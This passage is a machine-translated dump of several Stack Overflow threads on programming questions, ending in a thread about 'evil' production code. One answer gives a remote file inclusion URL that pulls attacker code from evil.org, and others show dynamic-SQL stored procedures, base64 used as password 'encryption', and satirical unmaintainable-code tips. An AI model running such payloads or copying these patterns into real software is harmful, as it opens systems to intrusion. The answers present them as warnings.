现在，我已经制作了自己的 slug 方法，所以我不需要为此编写一些代码。

我想知道确定这个 slug 是否唯一然后插入它的最佳位置在哪里，因为 slug 字段是唯一键索引。

最初，我在任何插入（针对表）上都有一个触发器，所以当输入数据时，然后确定 slug。我有一个函数检查包含用户文本（不是 slug）的记录数，然后生成 slug 并将记录计数 + 1 添加到新 slug 的末尾。

例如。

在表中找到 5 条具有相同用户生成内容的记录。用于此的 slug 现在是在末尾添加 6 的 slug-text。

缺陷：如果用户更改了他们的文本，slug 不会改变。

无论如何，我想知道其他人是否曾经解决过这个问题并找到任何解决方法？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-01-12T04:39:23.627

我有点喜欢stackoverflow的做法。也就是将ID 和 slug*都放入 url。*现在蛞蝓不再是唯一的。我相信 hulu.com 也是这样做的。我认为这是解决问题的实用方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-12T03:45:07.790

大多数网站不会更改 slug，因为如果用户编辑她的标题，它不应该破坏任何指向已经创建的帖子的链接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T03:51:26.827

对于您已经拥有的数据库解决方案，如果它运行良好，您还可以使用更新触发器在内容更改时更新 slug，但您应该寻找性能损失。

对于替代解决方案，您可以使用地图 [在启动时加载，包含现有的 slug]，其中包含作为 slug 的键和作为值的现有计数。每次生成 slug 时，确定现有值并将高于它的值附加到表中，然后更新地图。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-11-17T07:53:16.983

您可以为每个帖子使用 slug 的集合（带有帖子链接的单独表格），并确定一个实际上是最新的。您的帖子应存储当前帖子的 id，例如将其用于 SEO 作为规范。它还将受益于更改 slug 以进行更好的 SEO 优化。如果您不想使用 SEO - 您可以做任何您想做的事情（只需存储一个 slug），它会很好。有很多策略可以达到它的独特性。要通过索引在 DB 中执行相同的 slug 快速搜索，请使用“my_slug%”并从结果中构建唯一的（例如添加帖子的 id）。如果结果为空 - 继续保存。

但是，如果您使用 slug 集合 - 不要忘记让这些 url 可以从互联网访问

# java - 如何让文本字段水平填充 100%

> ID：434379
> 
> 赞同：6
> 
> 时间：2009-01-12T03:44:00.960
> 
> 标签：java, eclipse, swt

如果我有一个带有 SWT 的文本字段，我怎样才能让该字段填充到 100% 或某个指定的宽度。

例如，此文本字段只能水平达到这么多。

```
public class Tmp {
    public static void main (String [] args) {
        Display display = new Display ();
        Shell shell = new Shell (display);
        GridLayout gridLayout = new GridLayout ();
        shell.setLayout (gridLayout);

        Button button0 = new Button(shell, SWT.PUSH);
        button0.setText ("button0");

        Text text = new Text(shell, SWT.BORDER | SWT.FILL);
        text.setText ("Text Field");

        shell.setSize(500, 400);
        //shell.pack();
        shell.open();

        while (!shell.isDisposed ()) {
            if (!display.readAndDispatch ())
                display.sleep ();
        }
        display.dispose ();
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T08:26:12.140

做这样的事情：

```
Text text = new Text(shell, SWT.BORDER);
text.setText ("Text Field");
text.setLayoutData(new GridData(SWT.FILL, SWT.CENTER)); 
```

/：由于这是公认的答案，因此我删除了错误。谢谢纠正我。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-12T11:32:10.330

组件中元素的定位取决于您使用的 Layout 对象。在提供的示例中，您使用的是 GridLayout。这意味着，您需要提供一个特定的 LayoutData 对象来指示您希望组件如何显示。在 GridLayout 的情况下，对象是 GridData。

为了实现你想要的，你必须创建一个 GridData 对象来抓取所有水平空间并填充它：

```
// Fills available horizontal and vertical space, grabs horizontal space,grab
// does not  grab vertical space
GridData gd = new GridData(SWT.FILL, SWT.FILL, true, false);
text.setLayoutData(gd); 
```

替代方法包括使用不同的 LayoutManager，例如 FormLayout。此布局使用 FormData 对象，该对象还允许您指定组件在屏幕上的放置方式。

[您还可以阅读这篇关于 Layouts 的文章以了解 Layouts 的工作原理](http://www.eclipse.org/articles/article.php?file=Article-Understanding-Layouts/index.html)。

作为旁注，构造函数 new GridData(int style) 在文档中被标记为“不推荐”。此示例中显示的显式构造函数是首选。

# java - 为什么我不能在 web.xml 中编辑 servlet 名称？

> ID：434385
> 
> 赞同：0
> 
> 时间：2009-01-12T03:49:32.150
> 
> 标签：java, eclipse, tomcat, servlets

在我使用 Tomcat 和 Eclipse 编写 java servlet 的课程中​​，我已经完成了所有工作。我想知道的是为什么当我尝试编辑 web.xml 文件中的 servlet-name 时，eclipse 似乎给我带来了问题。eclipse 不允许你编辑这个文件吗？

我知道它会自动调整文件以包含您添加到项目中的 servlet，但我不能手动编辑它吗？我可以进去更改 servlet 名称，但它不适用于新的 servlet 名称。我可以在没有 Eclipse 的情况下手动完成这一切，而且效果很好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-12T03:54:00.723

距离我上次开发 servlet 已经有一段时间了，但我认为您应该在 servlet 映射中引用您的 servlet 名称。

此[链接](http://www.caucho.com/resin-3.0/servlet/tutorial/helloworld/index.xtp)可能会对您有所帮助。

# c# - WCF 的 Windows 身份验证是否足够？

> ID：434404
> 
> 赞同：0
> 
> 时间：2009-01-12T04:01:16.777
> 
> 标签：c#, wcf, security, authentication, authorization

我正在开发一个应用程序，其中对数据传输和访问的安全要求相当高。据我了解，Windows 身份验证是通过 Intranet 进行 TCP 的首选方法。

您如何处理不使用域且只有简单工作组可用的情况？（一些客户不会使用域来管理网络）。

是否足够使用交互式客户端详细信息（当前登录用户），或者我应该让他们单独重新输入他们的用户名和/或密码，否则我不是将安全性留给网络管理员以确保他们有适当的策略（即计算机在一段时间后被锁定）？这一点尤其重要，因为我知道有些用户很容易让他们的计算机保持登录状态，那么我如何确保帐户所有者是实际用户？

如果是这样，如果他们只是重新输入他们的身份验证详细信息，那么使用 Windows 身份验证而不是用户名/密码身份验证有什么意义？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T04:10:02.780

使用 Windows 身份验证的目的是为网络对象管理提供一个集中目录。如果你有工作组，我说你最好使用另一种技术，也许是会员提供者和角色提供者。

[这篇](http://blogs.msdn.com/sql_protocols/archive/2007/05/12/connecting-to-sql-server-from-a-workgroup-using-windows-authentication.aspx)文章讨论了做这样的事情的缺点。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-12T04:20:25.800

使用 Windows 身份验证的目的是利用预先存在的成员资格方案。在企业级开发中，这意味着管理员拥有他们习惯使用的集中式成员控制面板来管理域级安全性。用户的额外好处是一次登录计算机就可以访问多个应用程序，而无需重新输入他们的详细信息。

如果您还没有建立域级别的安全性，并且没有朝那个方向迁移的计划，那么成员资格提供程序选项将是 aspnet 中的更好选择。显然，您随后需要计划企业将如何处理多个登录和身份验证提供程序的维护。

[编辑] 啊……伊戈尔先到了那里。

# python - 使用 virtualenv 安装某些包

> ID：434407
> 
> 赞同：2
> 
> 时间：2009-01-12T04:05:35.690
> 
> 标签：python, virtualenv, buildout

所以，我想今年开始使用 virtualenv。我喜欢 no-site-packages 选项，这很好。但是我想知道如何将某些软件包安装到每个 virtualenv 中。例如，假设我想将 django 安装到每个 virtualenv 中……这可能吗，如果可以，怎么做？buildout 能解决这个问题吗？

* * *

好吧，与其说是 django，不如说是 django 应用程序...我不介意在每个 virtualenv 中安装一个 django 版本...我只是想知道是否有一些“无站点包”的中间选项

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-27T00:35:43.793

我知道你从哪里来的无站点选项。我想使用 pip freeze 来生成需求列表，并且不希望站点包中有很多多余的东西。我还需要使用多个版本的 django，因为我有尚未升级的遗留项目（一些旧的 svn 结帐（pre1.0）、一些 1.0 和一些新的 svn 结帐）。在全局站点包中安装 Django 并不是一个真正的选择。

相反，我有一个 django 文件夹，其中包含发布和几个不同的 svn 版本，并且只是符号链接到本地​​站点包中的适当版本。为了便于使用，我链接到与环境相同级别的本地站点包，然后链接到适当的 django 目录和我需要的任何其他“系统”样式包（通常只是 PIL）。所以：

```
$ virtualenv pyenv
$ ln -s ./pyenv/lib/python2.5/site-packages ./installed
$ ln -s /usr/lib/python2.5/site-packages/PIL ./installed
$ ln -s /opt/django/django1.0svn/trunk/django ./installed 
```

现在以下工作：

```
$ source pyenv/bin/activate
$ python
> import django
> import PIL 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T04:34:25.367

如果你想让 django 安装在每个 virtualenv 上，你还不如将它安装在 site-packages 目录中？只是一个想法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-14T02:23:50.560

我建议使用`virtualenv`'[引导](http://pypi.python.org/pypi/virtualenv#creating-your-own-bootstrap-scripts)支持。这允许您在创建 virtualenv 后执行任意 Python，例如安装新包。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T18:18:48.777

另一种选择（我用过的）是在创建虚拟环境后easy_install Django。这很容易编写脚本。您付出的代价是在您的每个虚拟环境中等待 Django 安装。

不过，我和 Toby 在一起：除非有令人信服的理由**，**你必须在每个虚拟环境中拥有一个单独的 Django 副本，否则你应该考虑将它安装在你的主要 Python 区域，并允许每个虚拟环境从那里使用它.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-13T21:22:10.123

我想看看这个项目：

[http://www.stereoplex.com/two-voices/fez-djangoskel-django-projects-and-apps-as-eggs](http://www.stereoplex.com/two-voices/fez-djangoskel-django-projects-and-apps-as-eggs)

可能是我的答案......

# java - 为什么 System.out/err 在 Java 中实现为字节流？

> ID：434408
> 
> 赞同：3
> 
> 时间：2009-01-12T04:05:41.183
> 
> 标签：java, iostream

我在 Sun 的命令行 I/O 上查看了[本教程。](http://java.sun.com/docs/books/tutorial/essential/io/cl.html)它指出：

> 您可能期望标准流是字符流，但由于历史原因，它们是字节流。System.out 和 System.err 被定义为 PrintStream 对象。虽然它在技术上是字节流，但 PrintStream 使用内部字符流对象来模拟字符流的许多特性。

有谁知道“历史原因”是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-12T04:27:25.477

“历史原因”是 Java 1.0 中不存在字符流。显然 Sun 意识到字符翻译模型的不足，在 Java 1.1 中添加了面向字符的 Reader/Writer 类层次结构。

但是对于 System.out 和朋友们来说已经太晚了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T04:10:12.687

我猜原因是为了向后兼容 POSIX C/C++ 标准 I/O，其中标准输入、标准输出和标准错误（分别相当于 System.in、System.out 和 System.err 的 C/C++ ) 是字节流。在 Windows 中，这些流执行 CRLF 转换，但在 POSIX 系统中，不会发生此类转换，您可以自由读写非字符二进制数据。许多 Unix 实用程序都这样做，例如 GNU`gzip`和`tar`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T04:20:08.033

请记住，Java 中的字符使用 16 位 Unicode 字符。最初的 System.in 等需要与支持 Java 的环境兼容，后者（当时在黎明时分）通常*不*支持 Unicode。这与对行尾的令人讨厌的不同处理一起，意味着字节流是唯一具有相同语义的类型，无论是什么平台。

# anti-patterns - 您在生产企业环境中见过的最邪恶的代码是什么？

> ID：434414
> 
> 赞同：76
> 
> 时间：2009-01-12T04:10:15.167
> 
> 标签：anti-patterns

您在公司的生产环境中见过的最邪恶或最危险的代码片段是什么？我从来没有遇到过我认为是故意恶意和邪恶的生产代码，所以我很想看看其他人发现了什么。

我见过的最危险的代码是一个存储过程，它距离我们的核心生产数据库服务器有两个链接服务器。存储过程接受任何 NVARCHAR(8000) 参数并通过双跳 sp_executeSQL 命令在目标生产服务器上执行该参数。也就是说，sp_executeSQL 命令执行了另一个 sp_executeSQL 命令，以便跳转两个链接的服务器。哦，链接服务器帐户在目标生产服务器上具有系统管理员权限。

* * *

## 回答 #1

> 赞同：330
> 
> 时间：2009-01-12T05:50:51.283

**警告：前面很长的可怕帖子**

我在[此处](https://stackoverflow.com/questions/193982/what-is-your-best-funniest-annoying-performance-tuning-experience#384225)和[此处](https://stackoverflow.com/questions/417279/double-reversals-on-technology-decisions#417743)写过关于我之前处理过的一个应用程序的文章。简单来说，我公司从印度继承了13万行垃圾。该应用程序是用 C# 编写的；这是一个柜员应用程序，每当你去银行时，柜员都会在柜台后面使用同样的软件。该应用程序每天崩溃 40-50 次，而且根本无法重构为工作代码。我的公司不得不在 12 个月的时间里重新编写整个应用程序。

为什么这个应用程序是邪恶的？因为看到源代码就足以让一个理智的人发疯和一个疯子的理智。用于编写此应用程序的扭曲逻辑只能受到洛夫克拉夫特式噩梦的启发。此应用程序的独特功能包括：

*   在 130,000 行代码中，整个应用程序包含 5 个类（不包括表单文件）。所有这些都是公共静态类。一个类称为 Globals.cs，其中包含 1000 和 1000 和 1000 个公共静态变量，用于保存应用程序的整个状态。这五个类总共包含 20,000 行代码，其余代码嵌入在表单中。

*   你不禁要问，程序员是如何在没有任何类的情况下编写出如此庞大的应用程序的？他们用什么来表示他们的数据对象？事实证明，通过简单地结合 ArrayLists、HashTables 和 DataTables，程序员成功地重新发明了我们所学到的有关 OOP 的一半概念。我们看到了很多这样的：

    *   哈希表的 ArrayLists
    *   具有字符串键和 DataRow 值的哈希表
    *   数据表的 ArrayLists
    *   包含 ArrayLists 的 DataRows 包含 HashTables
    *   DataRows 的 ArrayLists
    *   ArrayLists 的 ArrayLists
    *   带有字符串键和哈希表值的哈希表
    *   ArrayLists of ArrayLists of HashTables
    *   您能想到的所有其他 ArrayLists、HashTables、DataTables 组合。

    请记住，上面的数据结构都不是强类型的，因此您必须将列表中的任何神秘对象转换为正确的类型。仅使用 ArrayLists、HashTables 和 DataTables 就可以创建什么样的复杂的、类似于 Rube Goldberg 的数据结构，这真是令人惊讶。

*   为了分享如何使用上面详述的对象模型的示例，请考虑 Accounts：最初的程序员为帐户的每个可想象的属性创建了一个单独的 HashTable：一个名为 hstAcctExists、hstAcctNeedsOverride、hstAcctFirstName 的 HashTable。所有这些哈希表的键都是“|” 分隔的字符串。可以想象的键包括“123456|DDA”、“24100|SVG”、“100|LNS”等。

*   由于整个应用程序的状态很容易从全局变量中访问，因此程序员发现没有必要将参数传递给方法。我会说 90% 的方法采用 0 个参数。在少数这样做的情况下，为了方便起见，所有参数都作为字符串传递，而不管字符串表示什么。

*   不存在无副作用的功能。每个方法都修改了 Globals 类中的 1 个或多个变量。并非所有的副作用都有意义；例如，其中一种表单验证方法有一个神秘的副作用，即计算存储在 Globals.lngAcctNum 中的任何帐户的贷款多付和短付。

*   尽管有很多形式，但有一种形式可以统治所有形式：frmMain.cs，其中包含高达 20,000 行的代码。frmMain 做了什么？一切。它查账、打印收据、分发现金，什么都做。

    有时其他表单需要调用 frmMain 上的方法。与其将表单中的代码分解为单独的类，不如直接调用代码：

    ```
    ((frmMain)this.MDIParent).UpdateStatusBar(hstValues); 
    ```

*   为了查找帐户，程序员做了这样的事情：

    ```
    bool blnAccountExists =
        new frmAccounts().GetAccountInfo().blnAccountExists 
    ```

    尽管它已经创建了一个不可见的表单来执行业务逻辑，但您认为该表单如何知道要查找哪个帐户？这很简单：表单可以访问 Globals.lngAcctNum 和 Globals.strAcctType。（谁不喜欢匈牙利符号？）

*   代码重用是 ctrl-c、ctrl-v 的同义词。我发现 200 行方法在 20 个表单中复制/粘贴。

*   该应用程序有一个奇怪的线程模型，我喜欢称之为线程和定时器模型：每个生成线程的窗体上都有一个定时器。产生的每个线程都会启动一个延迟 200 毫秒的计时器；一旦计时器启动，它会检查线程是否设置了一些魔法布尔值，然后它会中止线程。产生的 ThreadAbortException 被吞下。

    你会认为你只会看到一次这种模式，但我至少在 10 个不同的地方发现了它。

*   说到线程，关键字“lock”从未出现在应用程序中。线程自由地操纵全局状态而无需锁定。

*   应用程序中的每个方法都包含一个 try/catch 块。每个异常都被记录并吞下。

*   开启字符串时谁需要开启枚举同样简单！

*   一些天才发现您可以将多个表单控件连接到同一个事件处理程序。程序员是如何处理这个问题的？

    ```
    private void OperationButton_Click(object sender, EventArgs e)
    {
        Button btn = (Button)sender;
        if (blnModeIsAddMc)
        {
            AddMcOperationKeyPress(btn);
        }
        else
        {
            string strToBeAppendedLater = string.Empty;
            if (btn.Name != "btnBS")
            {
                UpdateText();
            }
            if (txtEdit.Text.Trim() != "Error")
            {
                SaveFormState();
            }
            switch (btn.Name)
            {
                case "btnC":
                    ResetValues();
                    break;
                case "btnCE":
                    txtEdit.Text = "0";
                    break;
                case "btnBS":
                    if (!blnStartedNew)
                    {
                        string EditText = txtEdit.Text.Substring(0, txtEdit.Text.Length - 1);
                        DisplayValue((EditText == string.Empty) ? "0" : EditText);
                    }
                    break;
                case "btnPercent":
                    blnAfterOp = true;
                    if (GetValueDecimal(txtEdit.Text, out decCurrValue))
                    {
                        AddToTape(GetValueString(decCurrValue), (string)btn.Text, true, false);
                        decCurrValue = decResultValue * decCurrValue / intFormatFactor;
                        DisplayValue(GetValueString(decCurrValue));
                        AddToTape(GetValueString(decCurrValue), string.Empty, true, false);
                        strToBeAppendedLater = GetValueString(decResultValue).PadLeft(20)
                                                    + strOpPressed.PadRight(3);
                        if (arrLstTapeHist.Count == 0)
                        {
                            arrLstTapeHist.Add(strToBeAppendedLater);
                        }
                        blnEqualOccurred = false;
                        blnStartedNew = true;
                    }
                    break;
                case "btnAdd":
                case "btnSubtract":
                case "btnMultiply":
                case "btnDivide":
                    blnAfterOp = true;
                    if (txtEdit.Text.Trim() == "Error")
                    {
                        btnC.PerformClick();
                        return;
                    }
                    if (blnNumPressed || blnEqualOccurred)
                    {
                        if (GetValueDecimal(txtEdit.Text, out decCurrValue))
                        {
                            if (Operation())
                            {
                                AddToTape(GetValueString(decCurrValue), (string)btn.Text, true, true);
                                DisplayValue(GetValueString(decResultValue));
                            }
                            else
                            {
                                AddToTape(GetValueString(decCurrValue), (string)btn.Text, true, true);
                                DisplayValue("Error");
                            }
                            strOpPressed = btn.Text;
                            blnEqualOccurred = false;
                            blnNumPressed = false;
                        }
                    }
                    else
                    {
                        strOpPressed = btn.Text;
                        AddToTape(GetValueString(0), (string)btn.Text, false, false);
                    }
                    if (txtEdit.Text.Trim() == "Error")
                    {
                        AddToTape("Error", string.Empty, true, true);
                        btnC.PerformClick();
                        txtEdit.Text = "Error";
                    }
                    break;
                case "btnEqual":
                    blnAfterOp = false;
                    if (strOpPressed != string.Empty || strPrevOp != string.Empty)
                    {
                        if (GetValueDecimal(txtEdit.Text, out decCurrValue))
                        {
                            if (OperationEqual())
                            {
                                DisplayValue(GetValueString(decResultValue));
                            }
                            else
                            {
                                DisplayValue("Error");
                            }
                            if (!blnEqualOccurred)
                            {
                                strPrevOp = strOpPressed;
                                decHistValue = decCurrValue;
                                blnNumPressed = false;
                                blnEqualOccurred = true;
                            }
                            strOpPressed = string.Empty;
                        }
                    }
                    break;
                case "btnSign":
                    GetValueDecimal(txtEdit.Text, out decCurrValue);
                    DisplayValue(GetValueString(-1 * decCurrValue));
                    break;
            }
        }
    } 
    ```

*   同一位天才还发现了光荣的三元算子。以下是一些代码示例：

    `frmTranHist.cs [line 812]:`

    ```
    strDrCr = chkCredits.Checked && chkDebits.Checked ? string.Empty
                        : chkDebits.Checked ? "D"
                            : chkCredits.Checked ? "C"
                                : "N"; 
    ```

    `frmTellTransHist.cs [line 961]:`

    ```
    if (strDefaultVals == strNowVals && (dsTranHist == null ? true : dsTranHist.Tables.Count == 0 ? true : dsTranHist.Tables[0].Rows.Count == 0 ? true : false)) 
    ```

    `frmMain.TellCash.cs [line 727]:`

    ```
    if (Validations(parPostMode == "ADD" ? true : false)) 
    ```

*   这是一个代码片段，它演示了 StringBuilder 的典型误用。请注意程序员如何在循环中连接字符串，然后将生成的字符串附加到 StringBuilder：

    ```
    private string CreateGridString()
    {
        string strTemp = string.Empty;
        StringBuilder strBuild = new StringBuilder();
        foreach (DataGridViewRow dgrRow in dgvAcctHist.Rows)
        {
            strTemp = ((DataRowView)dgrRow.DataBoundItem)["Hst_chknum"].ToString().PadLeft(8, ' ');
            strTemp += "  ";
            strTemp += Convert.ToDateTime(((DataRowView)dgrRow.DataBoundItem)["Hst_trandt"]).ToString("MM/dd/yyyy");
            strTemp += "  ";
            strTemp += ((DataRowView)dgrRow.DataBoundItem)["Hst_DrAmount"].ToString().PadLeft(15, ' ');
            strTemp += "  ";
            strTemp += ((DataRowView)dgrRow.DataBoundItem)["Hst_CrAmount"].ToString().PadLeft(15, ' ');
            strTemp += "  ";
            strTemp += ((DataRowView)dgrRow.DataBoundItem)["Hst_trancd"].ToString().PadLeft(4, ' ');
            strTemp += "  ";
            strTemp += GetDescriptionString(((DataRowView)dgrRow.DataBoundItem)["Hst_desc"].ToString(), 30, 62);
            strBuild.AppendLine(strTemp);
        }
        strCreateGridString = strBuild.ToString();
        return strCreateGridString;//strBuild.ToString();
    } 
    ```

*   表上不存在主键、索引或外键约束，几乎所有字段都是 varchar(50) 类型，并且 100% 的字段可以为空。有趣的是，位域不用于存储布尔数据。而是使用了 char(1) 字段，字符“Y”和“N”分别用于表示真假。

    *   说到数据库，这里有一个存储过程的代表性示例：

        ```
        ALTER PROCEDURE [dbo].[Get_TransHist]
         ( 
              @TellerID   int = null,
              @CashDrawer int = null,
              @AcctNum    bigint = null,
              @StartDate  datetime = null,
              @EndDate    datetime = null,
              @StartTranAmt     decimal(18,2) = null,
              @EndTranAmt decimal(18,2) = null,
              @TranCode   int = null,
              @TranType   int = null
         )
        AS 
              declare @WhereCond Varchar(1000)
              declare @strQuery Varchar(2000)
              Set @WhereCond = ' '
              Set @strQuery = ' '
              If not @TellerID is null
                    Set @WhereCond = @WhereCond + ' AND TT.TellerID = ' + Cast(@TellerID as varchar)
              If not @CashDrawer is null
                    Set @WhereCond = @WhereCond + ' AND TT.CDId = ' + Cast(@CashDrawer as varchar)
              If not @AcctNum is null
                    Set @WhereCond = @WhereCond + ' AND TT.AcctNbr = ' + Cast(@AcctNum as varchar)
              If not @StartDate is null
                    Set @WhereCond = @WhereCond + ' AND Convert(varchar,TT.PostDate,121) >= ''' + Convert(varchar,@StartDate,121) + ''''
              If not @EndDate is null
                    Set @WhereCond = @WhereCond + ' AND Convert(varchar,TT.PostDate,121) <= ''' + Convert(varchar,@EndDate,121) + ''''
              If not @TranCode is null
                    Set @WhereCond = @WhereCond + ' AND TT.TranCode = ' + Cast(@TranCode as varchar)
              If not @EndTranAmt is null
                    Set @WhereCond = @WhereCond + ' AND TT.TranAmt <= ' + Cast(@EndTranAmt as varchar)
              If not @StartTranAmt is null
                    Set @WhereCond = @WhereCond + ' AND TT.TranAmt >= ' + Cast(@StartTranAmt  as varchar)
              If not (@TranType is null or @TranType = -1)
                    Set @WhereCond = @WhereCond + ' AND TT.DocType = ' + Cast(@TranType as varchar)
              --Get the Teller Transaction Records according to the filters
              Set @strQuery = 'SELECT 
                    TT.TranAmt as [Transaction Amount], 
                    TT.TranCode as [Transaction Code],
                    RTrim(LTrim(TT.TranDesc)) as [Transaction Description],
                    TT.AcctNbr as [Account Number],
                    TT.TranID as [Transaction Number],
                    Convert(varchar,TT.ActivityDateTime,101) as [Activity Date],
                    Convert(varchar,TT.EffDate,101) as [Effective Date],
                    Convert(varchar,TT.PostDate,101) as [Post Date],
                    Convert(varchar,TT.ActivityDateTime,108) as [Time],
                    TT.BatchID,
                    TT.ItemID,
                    isnull(TT.DocumentID, 0) as DocumentID,
                    TT.TellerName,
                    TT.CDId,
                    TT.ChkNbr,
                    RTrim(LTrim(DT.DocTypeDescr)) as DocTypeDescr,
                    (CASE WHEN TT.TranMode = ''F'' THEN ''Offline'' ELSE ''Online'' END) TranMode,
                    DispensedYN
              FROM TellerTrans TT WITH (NOLOCK)
              LEFT OUTER JOIN DocumentTypes DT WITH (NOLOCK) on DocType = DocumentType
              WHERE IsNull(TT.DeletedYN, 0) = 0 ' + @WhereCond + ' Order By BatchId, TranID, ItemID'    
              Exec (@strQuery) 
        ```

尽管如此，这个 130,000 行应用程序的最大问题是：没有单元测试。

是的，我已经把这个故事发给了 TheDailyWTF，然后我辞掉了工作。

* * *

## 回答 #2

> 赞同：69
> 
> 时间：2009-01-12T07:12:46.703

在一个接受信用卡付款的系统中，我们曾经存储完整的信用卡号以及姓名、到期日期等。

事实证明这是非法的，考虑到我们当时正在为司法部编写程序，这具有讽刺意味。

* * *

## 回答 #3

> 赞同：69
> 
> 时间：2009-01-12T08:14:59.853

我见过这样的密码加密功能

```
function EncryptPassword($password)
{
    return base64_encode($password);
} 
```

* * *

## 回答 #4

> 赞同：30
> 
> 时间：2009-05-29T17:57:11.110

这是一段商业代码中的错误处理例程：

```
/* FIXME! */
while (TRUE)
    ; 
```

我应该找出“应用程序不断锁定”的原因。

* * *

## 回答 #5

> 赞同：28
> 
> 时间：2009-01-12T04:48:37.773

一次组合所有以下 PHP 的“功能”。

1.  注册全局变量
2.  变量变量
3.  通过 include("http:// ... "); 包含远程文件和代码
4.  真正可怕的数组/变量名称（文字示例）：

    ```
    foreach( $variablesarry as $variablearry ){
      include( $$variablearry ); 
    } 
    ```

    **（在我意识到它们不是**同一个变量之前，我确实花了一个小时试图弄清楚它是如何工作的）

5.  包括 50 个文件，每个文件包括 50 个文件，并且以有条件和不可预测的方式在所有 50 个文件中线性/程序地执行内容。

对于那些不知道变量变量的人：

```
$x = "hello"; 
$$x = "world"; 
print $hello # "world" ; 
```

现在考虑 $x 包含来自您的 URL 的值（ register globals magic ），因此在您的代码中任何地方都不清楚您使用的变量是什么，因为它全部由 url 决定。

现在考虑当该变量的内容可以是网站用户指定的 url 时会发生什么。是的，这对您来说可能没有意义，但它会创建一个名为该 url 的变量，即：

`$http://google.com`,

除了不能直接访问之外，您必须通过上面的双 $ 技术使用它。

此外，当用户可以在 URL 上指定一个变量来指示要包含的文件时，会有一些讨厌的技巧，例如

`http://foo.bar.com/baz.php?include=http://evil.org/evilcode.php`

如果该变量出现在`include($include)`

'evilcode.php' 打印出它的纯文本代码，而 PHP 没有得到适当的保护，php 将直接下载 evilcode.php，并以 Web 服务器的用户身份执行它。

网络服务器会给它所有的权限等等，允许shell调用，下载任意二进制文件并运行它们等等，直到最终你想知道为什么你有一个磁盘空间不足的盒子，一个目录有8GB的盗版电影意大利配音，通过机器人在 IRC 上共享。

我很庆幸我发现在运行攻击的脚本之前的暴行决定做一些非常危险的事情，比如从或多或少不安全的数据库中获取极其机密的信息：|

（我可以用那个代码库每天招待dailywtf 6个月，我不骗你。我在逃避那个代码后发现dailywtf真是太遗憾了）

* * *

## 回答 #6

> 赞同：28
> 
> 时间：2010-04-11T07:25:00.010

在主项目头文件中，来自一位老手 COBOL 程序员，他莫名其妙地用 C 编写了一个编译器：

```
int i, j, k; 
```

“因此，如果您忘记声明循环变量，就不会出现编译器错误。”

* * *

## 回答 #7

> 赞同：25
> 
> 时间：2009-01-12T04:14:38.683

Windows 安装程序。

* * *

## 回答 #8

> 赞同：20
> 
> 时间：2010-04-11T07:46:36.310

这篇文章[如何编写不可维护的代码](http://freeworld.thc.org/root/phun/unmaintain.html)涵盖了人类已知的一些最出色的技术。我最喜欢的一些是：

* * *

**婴儿名字的新用途**

购买一本婴儿命名书，您将永远不会因为变量名而不知所措。Fred 是一个很棒的名字，而且易于输入。如果您正在寻找易于键入的变量名称，如果您使用 DSK 键盘键入，请尝试使用 adsf 或 aoeu。

**创意拼写错误**

如果您必须使用描述性变量和函数名称，请拼错它们。通过在某些函数和变量名称中拼写错误，并在其他名称中正确拼写（例如 SetPintleOpening SetPintalClosing），我们有效地否定了 grep 或 IDE 搜索技术的使用。它工作得非常好。通过在不同的剧院/剧院拼写 tory 或 tori 添加国际风味。

**是抽象的**

在命名函数和变量时，大量使用抽象词，如it、everything、data、handle、stuff、do、routine、perform 和数字，例如routineX48、PerformDataFunction、DoIt、HandleStuff 和do_args_method。

**大写**

将单词中间的音节的第一个字母随机大写。例如 ComputeRasterHistoGram()。

**小写 l 看起来很像数字 1**

使用小写 l 表示长常量。例如，10L 更容易被误认为是 101，而不是 10L。禁止任何明确消除歧义的字体 uvw wW gq9 2z 5s il17|!j oO08 `'" ;,. m nn rn {[()]}。要有创意。

**回收你的变量**

只要范围规则允许，就可以重用现有的不相关变量名。同样，将相同的临时变量用于两个不相关的目的（旨在节省堆栈槽）。对于恶魔般的变体，对变量进行变形，例如，在一个很长的方法的顶部为变量赋值，然后在中间的某个地方，以一种微妙的方式改变变量的含义，例如将其从基于 0 的坐标到基于 1 的坐标。一定不要记录这种意义的变化。

**cd wrttn wtht vwls s mch trsr**

在变量或方法名称中使用缩写时，用同一个词的多个变体来打破无聊，甚至偶尔用手写的方式拼出来。这有助于击败那些使用文本搜索仅了解程序的某些方面的懒惰的流浪汉。将变体拼写视为策略上的变体，例如混合国际颜色、美国颜色和老兄的 kulerz。如果您拼写全名，则每个名称只有一种可能的拼写方式。这些对于维护程序员来说太容易记住了。因为有很多不同的方式来缩写一个单词，所以使用缩写，你可以有几个不同的变量，它们都有相同的明显目的。作为额外的好处，维护程序员甚至可能不会注意到它们是单独的变量。

**晦涩的电影参考**

使用像 LancelotsFavouriteColour 这样的常量名称而不是蓝色，并为其分配十六进制值 $0204FB。颜色看起来与屏幕上的纯蓝色相同，维护程序员必须计算出 0204FB（或使用一些图形工具）才能知道它的外观。只有熟悉巨蟒和圣杯的人才知道兰斯洛特最喜欢的颜色是蓝色。如果维护程序员不能从记忆中引用整部 Monty Python 电影，那么他或她就没有资格成为程序员。

**记录明显的**

在代码中加上 /* add 1 to i */ 之类的注释，但是，永远不要记录诸如包或方法的总体用途之类的毛茸茸的东西。

**记录如何不为什么**

只记录程序所做的事情的细节，而不是它试图完成的事情。这样，如果有错误，修复者将不知道代码应该做什么。

**副作用**

在 C 中，函数应该是幂等的（没有副作用）。我希望这个提示就足够了。

**使用八进制**

将八进制文字走私到十进制数字列表中，如下所示：

```
array = new int []
{ 
111, 
120, 
013, 
121, 
